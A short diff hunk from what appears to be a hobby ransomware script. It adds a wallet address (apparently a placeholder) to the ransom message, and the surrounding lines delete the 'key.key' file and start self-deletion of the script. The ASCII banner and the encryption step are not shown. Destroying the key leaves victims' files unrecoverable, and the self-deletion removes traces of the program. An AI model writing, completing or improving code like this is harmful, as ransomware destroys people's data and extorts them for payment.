@@ -80,7 +80,7 @@ ___________.__  .__        __ /\        ___________                             
 /_______  /|____/__|\____/|__| /____  > /_______  /___|  /\___  >__|   / ____||   __/|__| |__|\____/|___|  /
         \/                          \/          \/     \/     \/       \/     |__|                       \/ 
 """)
-    print("you have been infected with ransomware pay 200$ in BTC to this wallet")
+    print("you have been infected with ransomware pay 200$ in BTC to this wallet : 123qweasdzxc123")
     os.remove("key.key")
     filename = sys.argv[0]
     # Spawn a new process to delete this file after a delay
